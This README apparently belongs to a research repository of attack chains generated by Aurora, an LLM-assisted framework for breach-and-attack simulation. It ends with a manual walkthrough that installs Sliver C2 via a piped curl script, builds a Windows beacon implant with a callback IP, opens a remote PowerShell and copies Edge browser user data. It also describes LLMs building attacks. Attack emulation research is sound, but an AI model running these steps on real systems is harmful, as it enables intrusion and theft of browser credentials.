# Aurora-demos: 
This projects contains the attack chains generated by Aurora, an semi-automated cyber attack construction framework.

Aurora is a framework that can construct multi-step cyberattacks (attack chains).
With the help of LLM, it makes use of external attack tools and threat intelligence reports.

We are preparing publishing the source code of Aurora.

## üéâ Introduction
<p><a href="https://arxiv.org/pdf/2407.16928"><img alt="Paper thumbnail" align="right" width="160" src="images/First_page.png"></a></p>

- Introduces AURORA, a PDDL-based cyberattack simulation system.
- Integrates LLMs into PDDL for real-world BAS.
- Automates construction of a 1,800+ action attack space with over 300 chains.
- AURORA generates higher quality attack plans with broader TTP coverage.

## Attack Demos
This repo stores attack demos generated by Aurora, which can be found in the `examples/` folder.
Each folder in `examples/` contains an attach chain, which includes the emulation plan details and attack steps.

### Emulation Plan Details
| Field | Description |
|  :---:  | --------------- |
| Adversary Name  | This refers to the name or codename of the attacker being simulated in the exercise. |
| Creation Time   | This indicates the exact date and time when the emulation plan or attack scenario was created. |

### Attack Step
| Field | Description |
|  :---:  | --------------- |
| uuid  | A unique identifier for the attack step, ensuring that each step can be individually referenced and tracked. |
| name   | A human-readable name for the attack step, which describes what the step aims to achieve or the action being performed. |
| id   | An identifier that may be used within a specific framework or system to reference the attack step. |
| source   | The origin or creator of the attack step, which can indicate whether it was developed internally, derived from a known threat intelligence source, or part of a manual process. |
| supported_platforms   | The operating systems or environments on which the attack step can be executed. |
| tactics   | The high-level goals or phases of the attack that this step supports. |
| technique   | The specific methods or technologies used in the attack step.  |
| description   | A detailed explanation of what the attack step does. |
| executor   | The command, script, or series of actions that need to be executed to carry out the attack step. |
| arguments   | Any parameters or inputs required by the executor to function correctly. |
| preconditions   | The conditions that must be met before the attack step can be successfully executed.  |
| effects   | The outcomes or changes that result from executing the attack step. |

</p>

### Execute the attack manually
‚ë†Download the latest sliver server release for your platform, and just run the binary.
```
kali > curl https://sliver.sh/install|sudo bash
kali > sliver
```
‚ë°Generate a beacon implant for the Windows platform and enable mTLS monitoring with the specified IP address.
```
sliver > generate beacon --arch amd64 --os  windows --mtls 192.168.130.128 --save .
sliver > mtls
```
‚ë¢Download the sliver implant manually and execute it on the target machine.

‚ë£Interact with a specific session identified by session_id.
```
sliver > sessions -i session_id
```
‚ë§Open an interactive powershell on the compromised machine.
```
sliver (SESSION_NAME) > shell
```
‚ë•Copy the Edge browser's default user data directory to a specified location for further analysis.
```
Powershell > Copy-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default" -Destination "C:\Users\win\Desktop\Edge" -Force -Recurse
```
